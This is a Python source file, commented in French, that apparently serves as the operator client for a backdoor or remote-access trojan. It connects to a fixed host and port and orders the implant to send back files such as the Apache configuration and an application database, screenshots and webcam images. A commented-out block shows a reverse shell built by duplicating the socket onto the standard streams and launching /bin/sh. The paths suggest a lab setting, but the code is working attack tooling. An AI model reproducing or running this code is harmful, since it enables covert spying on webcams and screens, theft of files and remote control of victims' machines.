from socket import *
import os, subprocess
from datetime import datetime

HOST = "192.168.1.21"
PORT = 26033

def reverse_shell():
    try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((HOST, PORT))
        print(s.recv(1024))
        cmd = input("entrer commande: ")
        # UNIQUMENT avec un client sous unix
        # if cmd == "root":
        #     # duplication des flux d'entrée: 0, sortie: 1 et d'erreur: 2
        #     # sur la socket client
        #     for i in range(3):
        #         os.dup2(s.fileno(), i)
            
        #     # utiliser sh pour demander un shell
        #     # dont le fluxs sont dupliqués sur la socket
        #     subprocess.run("/bin/sh", "-i")
    except (KeyboardInterrupt, SystemExit) as e:
        s.close()

def get_file(file_path):
    with socket(AF_INET, SOCK_STREAM) as s:
        cmd = f"get-file:{file_path}"
        s.connect((HOST, PORT))
        s.settimeout(5)
        s.send(bytes(cmd, "utf-8"))
        buffer = b""
        while True:
            try:
                raw_data = s.recv(1024)
                if raw_data == b'':
                    break
                buffer += raw_data
            except TimeoutError:
                break
    with open(file_path.replace("/", "_"), "wb") as f:
        f.write(buffer)

def quit_backd():
    with socket(AF_INET, SOCK_STREAM) as s:
        cmd = f"quit"
        s.connect((HOST, PORT))
        s.settimeout(5)
        s.send(bytes(cmd, "utf-8"))

# UNIQUEMENT SUR WINDOWS OU LINUX EN DEHORS DE VIRTUALBOX !!!
def screenshot():
    with socket(AF_INET, SOCK_STREAM) as s:
        cmd = f"ss"
        s.connect((HOST, PORT))
        s.settimeout(5)
        s.send(bytes(cmd, "utf-8"))
        buffer = b""
        while True:
            try:
                raw_data = s.recv(1024)
                if raw_data == b'':
                    break
                buffer += raw_data
            except TimeoutError:
                break
        with open(f"screenshot_{datetime.now().strftime('%Y_%m_%d_%H_%M')}.jpg", "wb") as f:
            f.write(buffer)

def webcam():
    with socket(AF_INET, SOCK_STREAM) as s:
        cmd = f"wc"
        s.connect((HOST, PORT))
        s.settimeout(5)
        s.send(bytes(cmd, "utf-8"))
        buffer = b""
        while True:
            try:
                raw_data = s.recv(1024)
                if raw_data == b'':
                    break
                buffer += raw_data
            except TimeoutError:
                break
        with open(f"cam_{datetime.now().strftime('%Y_%m_%d_%H_%M')}.jpg", "wb") as f:
            f.write(buffer)


if __name__ == "__main__":
    # get_file("/home/vagrant/TIWAP/TIWAP.db")
    # get_file("/etc/apache2/apache2.conf")
    # webcam()
    screenshot()
    quit_backd()
